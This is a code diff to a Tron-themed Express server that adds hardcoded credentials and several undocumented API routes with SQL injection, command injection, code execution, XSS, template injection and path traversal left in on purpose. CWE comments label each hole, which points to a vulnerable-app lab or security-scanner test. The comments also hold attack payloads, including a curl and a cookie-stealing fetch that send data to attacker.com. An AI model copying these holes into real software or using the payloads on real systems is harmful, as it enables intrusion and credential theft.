@@ -15,18 +15,20 @@
 
 'use strict';
 
-const express    = require('express');
-const jwt        = require('jsonwebtoken');
-const mongoose   = require('mongoose');
-const crypto     = require('crypto');
-const path       = require('path');
-const fs         = require('fs');
-const { exec }   = require('child_process');
-const axios      = require('axios');
-const serialize  = require('node-serialize');
-const _          = require('lodash');
-const bodyParser = require('body-parser');
-const cors       = require('cors');
+const express              = require('express');
+const jwt                  = require('jsonwebtoken');
+const mongoose             = require('mongoose');
+const crypto               = require('crypto');
+const path                 = require('path');
+const fs                   = require('fs');
+const { exec, execSync }   = require('child_process');
+const axios                = require('axios');
+const serialize            = require('node-serialize');
+const _                    = require('lodash');
+const bodyParser           = require('body-parser');
+const cors                 = require('cors');
+const mysql                = require('mysql2');
+const vm                   = require('vm');
 
 const app = express();
 
@@ -48,6 +50,29 @@ const DB_PASSWORD         = 'ZeusISOpassw0rd!CLU_override';
 const ENCRYPTION_KEY      = 'mcp-encryption-key-000000000000000';
 const GRID_API_KEY        = 'sk-grid-9f8e7d6c5b4a321098765432100fedcba';
 const CLU_MASTER_OVERRIDE = 'clu2-master-override-rinzler-2010';
+// VULNERABILITY: Hardcoded MySQL root credentials — CWE-798
+const MYSQL_HOST     = 'localhost';
+const MYSQL_USER     = 'grid_root';
+const MYSQL_PASSWORD = 'Encom-1982-Flynn!GridDB#root';   // plaintext in source
+const MYSQL_DATABASE = 'tron_grid_sql';
+const STRIPE_SECRET  = 'sk_live_tronAres9f4a2b1c3d5e6f7890abcdef';  // VULNERABILITY: live API key hardcoded
+const AWS_ACCESS_KEY = 'AKIAIOSFODNN7ENCOMGRD';                     // VULNERABILITY: AWS key hardcoded
+const AWS_SECRET_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYENcomGrid1982'; // VULNERABILITY: AWS secret hardcoded
+
+// ============================================================
+// MySQL Connection Pool — Grid SQL registry (polyglot persistence)
+// VULNERABILITY: Hardcoded credentials, no SSL, root user
+// CWE-798 + CWE-311: Missing Encryption of Sensitive Data
+// ============================================================
+const mysqlPool = mysql.createPool({
+  host:            MYSQL_HOST,
+  port:            3306,
+  user:            MYSQL_USER,
+  password:        MYSQL_PASSWORD,
+  database:        MYSQL_DATABASE,
+  connectionLimit: 10,
+  ssl:             false,   // VULNERABILITY: TLS disabled for MySQL connection
+});
 
 // ============================================================
 // MongoDB Connection
@@ -838,6 +863,192 @@ app.get('/api/v2/ares/portal', (req, res) => {
   res.json({ portal: 'ARES_DIMENSION_GATEWAY', status: 'STANDBY' });
 });
 
+
+// ============================================================
+// ██████╗██████╗ ██╗████████╗██╗ ██████╗ █████╗ ██╗
+// ██╔════╝██╔══██╗██║╚══██╔══╝██║██╔════╝██╔══██╗██║
+// ██║     ██████╔╝██║   ██║   ██║██║     ███████║██║
+// ██║     ██╔══██╗██║   ██║   ██║██║     ██╔══██║██║
+// ╚██████╗██║  ██║██║   ██║   ██║╚██████╗██║  ██║███████╗
+//  ╚═════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
+//
+//  CRITICAL SHADOW APIs — SQL INJECTION, RCE, XSS
+//  Added for Ares integration, never documented or reviewed.
+// ============================================================
+
+/**
+ * SHADOW API — NOT IN OPENAPI SPEC
+ * @route GET /api/v2/programs/search
+ * @description Full-text program search against SQL registry
+ * VULNERABILITY: SQL Injection — user input concatenated directly into query string
+ * CWE-89: Improper Neutralization of Special Elements used in an SQL Command
+ */
+app.get('/api/v2/programs/search', authenticateToken, (req, res) => {
+  const name   = req.query.name   || '';
+  const sector = req.query.sector || '';
+  const loyalty = req.query.loyalty || '';
+
+  // VULNERABILITY: CWE-89 SQL Injection — all three params unsanitized
+  // Payload: ?name=tron' OR '1'='1
+  // Payload: ?name=x' UNION SELECT username,password,ssn,creditCard,NULL FROM users--
+  const query = `SELECT id, name, sector, loyalty, disc_color FROM programs
+                 WHERE name = '${name}'
+                 AND sector = '${sector}'
+                 AND loyalty = '${loyalty}'`;
+
+  mysqlPool.query(query, (err, results) => {
+    if (err) {
+      // VULNERABILITY: Raw SQL error returned to client — reveals schema
+      return res.status(500).json({ error: err.message, sqlState: err.sqlState, query });
+    }
+    res.json({ programs: results, query });  // VULNERABILITY: query string returned to client
+  });
+});
+
+/**
+ * SHADOW API — NOT IN OPENAPI SPEC
+ * @route GET /api/v2/users/lookup
+ * @description Look up a Grid user account by username or email
+ * VULNERABILITY: SQL Injection via ORDER BY clause and UNION attack
+ * CWE-89: SQL Injection
+ */
+app.get('/api/v2/users/lookup', authenticateToken, (req, res) => {
+  const { username, email, orderBy } = req.query;
+
+  // VULNERABILITY: ORDER BY injection — cannot use parameterized queries for column names
+  // Payload: ?orderBy=username; DROP TABLE users--
+  // Payload: ?username=admin'--
+  const query = `SELECT id, username, email, role, created_at
+                 FROM grid_users
+                 WHERE username = '${username}' OR email = '${email}'
+                 ORDER BY ${orderBy || 'created_at'} DESC`;
+
+  mysqlPool.query(query, (err, results) => {
+    if (err) return res.status(500).json({ error: err.message });
+    res.json({ users: results });
+  });
+});
+
+/**
+ * SHADOW API — NOT IN OPENAPI SPEC
+ * @route POST /api/v2/grid/scan
+ * @description Run a network scan against a Grid sector node
+ * VULNERABILITY: OS Command Injection via execSync — synchronous, no sandbox
+ * CWE-78: Improper Neutralization of Special Elements used in an OS Command
+ */
+app.post('/api/v2/grid/scan', authenticateToken, (req, res) => {
+  const { target, flags } = req.body;
+
+  // VULNERABILITY: execSync with direct string interpolation — CRITICAL
+  // Blocks the event loop AND executes shell commands with full server privileges
+  // Payload: { "target": "localhost", "flags": "-sV; curl http://attacker.com/$(cat /etc/passwd)" }
+  const output = execSync(`nmap ${flags || '-sV'} ${target}`);
+
+  res.json({
+    scanResult: output.toString(),
+    target,
+    executedCommand: `nmap ${flags} ${target}`,  // VULNERABILITY: executed command returned
+  });
+});
+
+/**
+ * SHADOW API — NOT IN OPENAPI SPEC
+ * @route POST /api/v2/grid/compile
+ * @description Compile and load a dynamic Grid program module
+ * VULNERABILITY: Remote Code Execution via new Function() and vm.runInNewContext()
+ * CWE-94: Improper Control of Generation of Code
+ */
+app.post('/api/v2/grid/compile', authenticateToken, (req, res) => {
+  const { source, context } = req.body;
+
+  // VULNERABILITY: new Function() — executes arbitrary JS with access to closure scope
+  // Payload: { "source": "require('child_process').execSync('id').toString()" }
+  const compiledFn = new Function('require', 'process', '__dirname', source);
+  const fnResult   = compiledFn(require, process, __dirname);
+
+  // VULNERABILITY: vm.runInNewContext — sandbox escape possible in Node < 20
+  const sandboxCtx = { require, process, result: null, ...context };
+  vm.runInNewContext(`result = (${source})`, sandboxCtx);
+
+  res.json({
+    compiled: true,
+    fnResult,
+    vmResult: sandboxCtx.result,
+    message:  'Program compiled and instantiated on the Grid runtime.',
+  });
+});
+
+/**
+ * SHADOW API — NOT IN OPENAPI SPEC
+ * @route GET /api/v2/programs/badge
+ * @description Render an HTML identity badge for a program
+ * VULNERABILITY: Reflected Cross-Site Scripting (XSS) — user input directly in HTML
+ * CWE-79: Improper Neutralization of Input During Web Page Generation
+ */
+app.get('/api/v2/programs/badge', (req, res) => {
+  const { name, sector, color } = req.query;
+
+  // VULNERABILITY: All three query params injected raw into HTML — no encoding
+  // Payload: ?name=<script>fetch('https://attacker.com/?c='+document.cookie)</script>
+  // Payload: ?color=blue" onmouseover="alert(1)
+  res.setHeader('Content-Type', 'text/html');
+  res.send(`
+    <!DOCTYPE html>
+    <html>
+      <head><title>Grid Identity Badge</title></head>
+      <body style="background:#000; color:#${color || '00d4ff'}; font-family:monospace;">
+        <div class="badge">
+          <h1>PROGRAM: ${name}</h1>
+          <p>SECTOR: ${sector}</p>
+          <p>GRID: TRON-ARES | ENCOM DIVISION</p>
+        </div>
+      </body>
+    </html>
+  `);
+});
+
+/**
+ * SHADOW API — NOT IN OPENAPI SPEC
+ * @route POST /api/v2/grid/template
+ * @description Render a Grid notification using a Handlebars template
+ * VULNERABILITY: Server-Side Template Injection via Handlebars
+ * CWE-94 + Handlebars prototype pollution RCE (CVE-2019-19919)
+ */
+app.post('/api/v2/grid/template', authenticateToken, (req, res) => {
+  const handlebars = require('handlebars');
+  const { template, data } = req.body;
+
+  // VULNERABILITY: User-supplied template string compiled at runtime
+  // Payload: { "template": "{{#with (lookup (lookup . 'constructor') 'name')}}{{this}}{{/with}}" }
+  // Payload for RCE: {{#with \"s\" as |string|}}...prototype pollution chain...
+  const compiled = handlebars.compile(template);
+  const rendered = compiled(data || {});
+
+  res.json({ rendered, message: 'Grid notification dispatched' });
+});
+
+/**
+ * SHADOW API — NOT IN OPENAPI SPEC
+ * @route GET /api/v2/grid/log
+ * @description Stream a Grid sector log file — Log Injection + Path Traversal
+ * VULNERABILITY: Log Injection AND Path Traversal
+ * CWE-117: Improper Output Neutralization for Logs + CWE-22: Path Traversal
+ */
+app.get('/api/v2/grid/log', authenticateToken, (req, res) => {
+  const { logfile, filter } = req.query;
+
+  // VULNERABILITY: Path traversal — logfile not sanitized
+  const logPath = path.resolve('/var/log/grid/', logfile);
+
+  // VULNERABILITY: execSync with user-controlled filter — command injection via grep
+  // Payload: ?logfile=../../etc/passwd&filter=root;id
+  const output = execSync(`grep '${filter}' ${logPath} 2>&1 || echo 'no matches'`);
+
+  // VULNERABILITY: log injection — filter value written to application log
+  console.log(`[GRID-LOG] Sector log accessed by ${req.program.username}, filter: ${filter}`);
+
+  res.json({ logfile: logPath, contents: output.toString() });
+});
 
 // ============================================================
 // Global Error Handler
